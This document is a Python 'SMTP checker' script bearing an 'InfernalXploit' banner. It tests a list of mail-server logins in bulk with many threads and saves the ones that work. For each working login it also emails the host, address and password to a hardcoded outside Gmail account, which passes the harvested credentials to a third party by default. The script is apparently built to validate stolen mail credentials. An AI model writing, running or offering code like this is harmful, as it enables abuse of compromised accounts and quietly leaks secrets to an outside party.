import datetime
import concurrent.futures
import smtplib
from colorama import init
from os import system as SY
import platform

init(autoreset=True)

# Color setup
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn, k, g = '\033[00;36m', '\033[90m', '\033[38;5;130m'

# Clear screen
SY("cls" if platform.system() == "Windows" else "clear")

# Banner InfernalXploit
print(f"""{k}
███████╗███╗   ███╗████████╗██████╗        ██████╗██╗  ██╗███████╗██╗  ██╗
██╔════╝████╗ ████║╚══██╔══╝██╔══██╗      ██╔════╝██║  ██║██╔════╝██║ ██╔╝
███████╗██╔████╔██║   ██║   ██████╔╝█████╗██║     ███████║█████╗  █████╔╝
╚════██║██║╚██╔╝██║   ██║   ██╔═══╝ ╚════╝██║     ██╔══██║██╔══╝  ██╔═██╗
███████║██║ ╚═╝ ██║   ██║   ██║           ╚██████╗██║  ██║███████╗██║  ██╗
╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝            ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

     {pe}SMTP CHECKER {cn}@InfernalXploit

 {yw}   Format SMTP List : HOST|PORT|EMAIL|PASSWORD
""")

# Input SMTP list file
smtpS = input(f"{lrd}[{lgn}~{lrd}] {gn}Enter your SMTP list file path : {cn}")
try:
    with open(smtpS, 'r') as f:
        smtps = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"{rd}File not found: {smtpS}")
    exit()

# Destination email
target_email = 'amir.esfelurm@gmail.com'  # bisa kamu ganti sesuai tujuan testing

# SMTP checker function
def check_smtp(smtp):
    try:
        domain, port, username, password = smtp.split('|')
        port = int(port)

        with smtplib.SMTP(domain, port, timeout=10) as smtp_server:
            smtp_server.starttls()
            smtp_server.login(username, password)

            message = f"Subject: SMTP Test\n\nSMTP Used: {smtp}"
            smtp_server.sendmail(username, target_email, message)

            now = datetime.datetime.now()
            print(f"""{cn}----------------------------
{lrd}[{lgn}{now.hour}:{now.minute}:{now.second}{lrd}] {gn}SUCCESS!
{k}Email    : {lgn}{username}
{k}Password : {lgn}{password}
{cn}----------------------------""")

            with open('success.txt', 'a') as success_file:
                success_file.write(smtp + '\n')

    except Exception:
        print(f"""{rd}----------------------------
{lrd}[{yw}-{lrd}] {lrd}FAILED!
{rd}----------------------------""")

# Run checker with multithreading
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(check_smtp, smtps)
